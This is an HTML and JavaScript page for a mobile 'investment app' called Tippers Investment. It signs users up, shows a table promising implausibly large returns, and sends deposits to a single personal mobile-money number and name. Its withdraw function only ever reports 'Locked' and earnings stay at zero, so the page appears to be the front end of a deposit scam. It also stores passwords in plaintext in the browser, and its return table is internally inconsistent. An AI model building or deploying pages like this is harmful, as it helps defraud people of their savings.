<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>

body{
margin:0;
font-family:Segoe UI;
background:#0b1120;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.app{
width:380px;
background:#000;
border-radius:20px;
overflow:hidden;
color:white;
display:flex;
flex-direction:column;
}

.content{
padding:20px;
height:520px;
overflow-y:auto;
overflow-x:hidden;
}

.title{color:#f59e0b;text-align:center;font-weight:bold;}
.desc{text-align:center;margin-top:10px;font-size:13px;}

input,select{
width:100%;
padding:10px;
margin-top:8px;
border-radius:8px;
border:none;
background:#0f172a;
color:white;
}

button{
width:100%;
padding:12px;
margin-top:15px;
border:none;
border-radius:10px;
background:linear-gradient(135deg,#f59e0b,#f97316);
color:white;
font-weight:bold;
cursor:pointer;
}

.row{display:flex;gap:5px;}

.nav{
display:flex;
justify-content:space-around;
background:#020617;
padding:10px;
}

.nav div{text-align:center;cursor:pointer;}
.nav i{display:block;font-size:20px;margin-bottom:3px;}

#toast{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:red;
color:white;
padding:10px;
border-radius:8px;
display:none;
}

.card{
background:#111;
padding:15px;
border-radius:12px;
margin-top:10px;
}

/* ===== TABLE FIX ===== */
.table-wrapper{
background:#000;
padding:10px;
border-radius:12px;
border:1px solid #222;
overflow-x:auto;
}

.table{
display:grid;
grid-template-columns:repeat(7, minmax(100px, 1fr));
gap:6px;
font-size:11px;
text-align:center;
min-width:750px;
}

.cell{
background:#0f172a;
padding:8px;
border-radius:6px;
white-space:nowrap;
}

.cell.head{
background:#f59e0b;
color:black;
font-weight:bold;
}

.plan-title{
text-align:center;
color:#ff3b3b;
font-weight:bold;
margin-bottom:5px;
}

.sub-title{
text-align:center;
font-size:12px;
color:#f59e0b;
margin-bottom:10px;
}

</style>
</head>

<body>

<div class="app">

<div class="content" id="screen"></div>

<div class="nav" id="nav" style="display:none">
<div onclick="home()"><i class="fa fa-home"></i>HOME</div>
<div onclick="deposit()"><i class="fa fa-wallet"></i>DEPOSIT</div>
<div onclick="earn()"><i class="fa fa-chart-line"></i>EARN</div>
<div onclick="withdraw()"><i class="fa fa-money-bill"></i>WITHDRAW</div>
</div>

</div>

<div id="toast"></div>

<script>

let users = JSON.parse(localStorage.getItem("users")) || [];
let currentUser = null;
let depositDone = false;
let amount = 0;
let selectedPeriod = 0;

const screen=document.getElementById("screen");
const nav=document.getElementById("nav");

function toast(msg){
let t=document.getElementById("toast");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2500);
}

/* START */
function start(){
nav.style.display="none";
screen.innerHTML=`
<h2 class="title">WELCOME TO TIPPERS INVESTMENT APP !</h2>
<p class="desc">Start now and grow your income smartly.</p>
<button onclick="register()">START</button>
`;
}

/* REGISTER */
function register(){
screen.innerHTML=`
<h3 class="title">REGISTER</h3>

<input id="f" placeholder="First name">
<input id="l" placeholder="Last name">

<select id="g">
<option value="">Gender</option>
<option>Male</option>
<option>Female</option>
</select>

<div class="row">
<select id="code">
<option>+250 RWA</option>
<option>+254 KEN</option>
</select>
<input id="phone" placeholder="Phone">
</div>

<input id="email" placeholder="Email">
<input id="pass" placeholder="6 digit password">
<input id="cpass" placeholder="Confirm password">

<button onclick="doRegister()">REGISTER</button>
`;
}

function doRegister(){

if(!f.value||!l.value||!g.value||!phone.value||!email.value||!pass.value||!cpass.value){
toast("Fill all fields ❌"); return;
}

if(!email.value.includes("@")){
toast("Invalid email ❌"); return;
}

if(!/^[0-9]{6}$/.test(pass.value)){
toast("Password must be 6 digits ❌"); return;
}

if(pass.value!==cpass.value){
toast("Passwords mismatch ❌"); return;
}

users.push({email:email.value,pass:pass.value});
localStorage.setItem("users",JSON.stringify(users));

toast("Registered ✔");
login();
}

/* LOGIN */
function login(){
screen.innerHTML=`
<h3 class="title">LOGIN</h3>

<input id="le" placeholder="Email">
<input id="lp" placeholder="Password">

<button onclick="doLogin()">LOGIN</button>
`;
}

function doLogin(){

let u=users.find(x=>x.email===le.value);
if(!u){toast("Account not found ❌");return;}
if(lp.value!==u.pass){toast("Wrong password ❌");return;}

currentUser=u;
nav.style.display="flex";
showPlan();
}

/* ===== PLAN TABLE ===== */
function showPlan(){

screen.innerHTML=`
<div class="plan-title">TIPPERS INVESTMENT PLAN</div>
<div class="sub-title">2.2% • WEEK • MONTH • 45D • 3M • 4M</div>

<div class="table-wrapper">
<div class="table">

<div class="cell head">INV</div>
<div class="cell head">2.2%</div>
<div class="cell head">WEEK</div>
<div class="cell head">MONTH</div>
<div class="cell head">45D</div>
<div class="cell head">3M</div>
<div class="cell head">4M</div>

<div class="cell">5K</div><div class="cell">110</div><div class="cell">1050</div><div class="cell">5400</div><div class="cell">9225</div><div class="cell">22500</div><div class="cell">42000</div>

<div class="cell">50K</div><div class="cell">1100</div><div class="cell">10500</div><div class="cell">54000</div><div class="cell">92250</div><div class="cell">225K</div><div class="cell">420K</div>

<div class="cell">100K</div><div class="cell">2200</div><div class="cell">21000</div><div class="cell">108000</div><div class="cell">184500</div><div class="cell">450K</div><div class="cell">840K</div>

<div class="cell">150K</div><div class="cell">3300</div><div class="cell">31500</div><div class="cell">162000</div><div class="cell">276750</div><div class="cell">675K</div><div class="cell">1.26M</div>

<div class="cell">300K</div><div class="cell">6600</div><div class="cell">63000</div><div class="cell">324000</div><div class="cell">553500</div><div class="cell">1.35M</div><div class="cell">2.52M</div>

<div class="cell">500K</div><div class="cell">11000</div><div class="cell">105000</div><div class="cell">540000</div><div class="cell">922500</div><div class="cell">2.25M</div><div class="cell">4.2M</div>

<div class="cell">700K</div><div class="cell">15400</div><div class="cell">147000</div><div class="cell">756000</div><div class="cell">1291500</div><div class="cell">3.15M</div><div class="cell">5.88M</div>

<div class="cell">1M</div><div class="cell">22000</div><div class="cell">210000</div><div class="cell">1080000</div><div class="cell">1845000</div><div class="cell">4.5M</div><div class="cell">8.4M</div>

<div class="cell">1.5M</div><div class="cell">33000</div><div class="cell">315000</div><div class="cell">1620000</div><div class="cell">2767500</div><div class="cell">6.25M</div><div class="cell">12.6M</div>

</div>
</div>

<button onclick="deposit()">NEXT</button>
`;
}

/* DEPOSIT FLOW */
function deposit(){
screen.innerHTML=`
<h3 class="title">DEPOSIT</h3>

<input id="amt" placeholder="Amount">
<input id="sender" placeholder="Sender">

<button onclick="goPayment()">CONTINUE</button>
`;
}

function goPayment(){
amount=parseInt(amt.value);
payment();
}

function payment(){
screen.innerHTML=`
<h3 class="title">PAYMENT INFO</h3>

<div class="card">0795410739<br>BARAKA BOLINGO</div>

<button onclick="dial()">DIAL & PAY</button>
`;
}

function dial(){
screen.innerHTML=`
<input type="file" id="file">
<button onclick="submitProof()">SUBMIT</button>
`;
}

function submitProof(){
depositDone=true;
withdraw();
}

/* WITHDRAW */
function withdraw(){
screen.innerHTML=`
<h3 class="title">WITHDRAW</h3>
<input placeholder="Amount">
<button onclick="toast('Locked')">WITHDRAW</button>
`;
}

/* EARN */
function earn(){
screen.innerHTML=`
<h3 class="title">LIVE EARNINGS</h3>
<div class="card"><h2>0 RWF</h2></div>
`;
}

/* HOME */
function home(){
showPlan();
}

start();

</script>

</body>
</html>
